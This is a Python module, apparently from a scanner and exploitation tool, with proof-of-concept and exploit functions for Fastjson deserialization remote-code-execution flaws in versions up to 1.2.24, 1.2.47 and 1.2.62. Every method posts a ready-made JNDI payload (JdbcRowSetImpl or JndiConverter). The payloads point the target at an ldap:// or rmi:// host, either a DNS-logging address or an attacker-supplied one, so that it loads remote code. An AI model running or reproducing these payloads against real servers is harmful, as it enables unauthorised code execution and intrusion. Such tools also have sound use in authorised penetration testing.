#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import json
from thirdparty import requests
import threading
from core.verify import verify
from module import globals
from thirdparty.requests_toolbelt.utils import dump
from module.api.dns import dns_result, dns_request


class Fastjson():
    def __init__(self, url):
        self.url = url
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def fastjson_1224_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Fastjson: 1.2.24"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_name"] = "Fastjson 反序列化远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2017-18349"
        self.vul_info["vul_apps"] = "Fastjson"
        self.vul_info["vul_date"] = "2017-03-15"
        self.vul_info["vul_vers"] = "<= 1.2.24"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Fastjson中的parseObject允许远程攻击者通过精心制作的JSON请求执行任意代码"
        self.vul_info["cre_date"] = "2021-01-20"
        self.vul_info["cre_auth"] = "zhzyker"
        headers = {'User-Agent': self.ua, 'Content-Type': "application/json", 'Connection': 'close'}
        md = dns_request()
        dns = md
        data = {
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "ldap://"+dns+"//Exploit",
                "autoCommit": True
            }
        }
        data = json.dumps(data)
        try:
            try:
                request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
            except:
                pass
            if dns_result(md):
                self.vul_info["vul_payd"] = "ldap://" + dns + "//Exploit] "
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[dns] [payload: ldap://"+dns+"//Exploit] "
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def fastjson_1247_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Fastjson: 1.2.47"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_name"] = "Fastjson 反序列化远程代码执行漏洞"
        self.vul_info["vul_numb"] = "null"
        self.vul_info["vul_apps"] = "Fastjson"
        self.vul_info["vul_date"] = "2019-07-15"
        self.vul_info["vul_vers"] = "<= 1.2.47"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。"
        self.vul_info["cre_date"] = "2021-01-20"
        self.vul_info["cre_auth"] = "zhzyker"
        headers = {'User-Agent': self.ua, 'Content-Type': "application/json", 'Connection': 'close'}
        md = dns_request()
        dns = md
        data = {
            "a": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "ldap://"+dns+"//Exploit",
                "autoCommit": True
            }
        }
        data = json.dumps(data)
        try:
            try:
                request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
            except:
                pass
            if dns_result(md):
                self.vul_info["vul_payd"] = "ldap://"+dns+"//Exploit] "
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[dns] [payload: ldap://"+dns+"//Exploit] "
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def fastjson_1262_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Fastjson: 1.2.62"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_name"] = "Fastjson 反序列化远程代码执行漏洞"
        self.vul_info["vul_numb"] = "null"
        self.vul_info["vul_apps"] = "Fastjson"
        self.vul_info["vul_date"] = "2019-10-07"
        self.vul_info["vul_vers"] = "<= 1.2.62"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "官方暂未发布针对此漏洞的修复版本，开启了autoType功能的受影响用户可通过关闭autoType来规避风险" \
                                    "（autoType功能默认关闭），另建议将JDK升级到最新版本。"
        self.vul_info["cre_date"] = "2021-01-21"
        self.vul_info["cre_auth"] = "zhzyker"
        headers = {'User-Agent': self.ua, 'Content-Type': "application/json"}
        md = dns_request()
        dns = md
        data = {
            "@type": "org.apache.xbean.propertyeditor.JndiConverter",
            "AsText": "ldap://" + dns + "//exploit"
        }
        data = json.dumps(data)
        try:
            try:
                request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
            except:
                pass
            if dns_result(md):
                self.vul_info["vul_payd"] = "ldap://" + dns + "//Exploit] "
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[dns] [payload: ldap://"+dns+"//Exploit] "
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def fastjson_1224_exp(self, rmi_ldap):
        vul_name = "Fastjson: 1.2.24"
        data = {
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": rmi_ldap,
                "autoCommit": True
            }
        }
        headers = {'User-Agent': self.ua, 'Content-Type': "application/json"}
        data = json.dumps(data)
        try:
            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
            r = "Command Executed Successfully (But No Echo)"
            raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def fastjson_1247_exp(self, rmi_ldap):
        vul_name = "Fastjson: 1.2.47"
        headers = {'User-Agent': self.ua, 'Content-Type': "application/json"}
        data = {
            "a": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": rmi_ldap,
                "autoCommit": True
            }
        }
        data = json.dumps(data)
        try:
            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
            raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            r = "Command Executed Successfully (But No Echo)"
            verify.exploit_print(r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def fastjson_1262_exp(self, rmi_ldap):
        vul_name = "Fastjson: 1.2.62"
        headers = {'User-Agent': self.ua, 'Content-Type': "application/json"}
        data = {
            "@type": "org.apache.xbean.propertyeditor.JndiConverter",
            "AsText": rmi_ldap
        }
        data = json.dumps(data)
        try:
            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
            raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            r = "Command Executed Successfully (But No Echo)"
            verify.exploit_print(r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

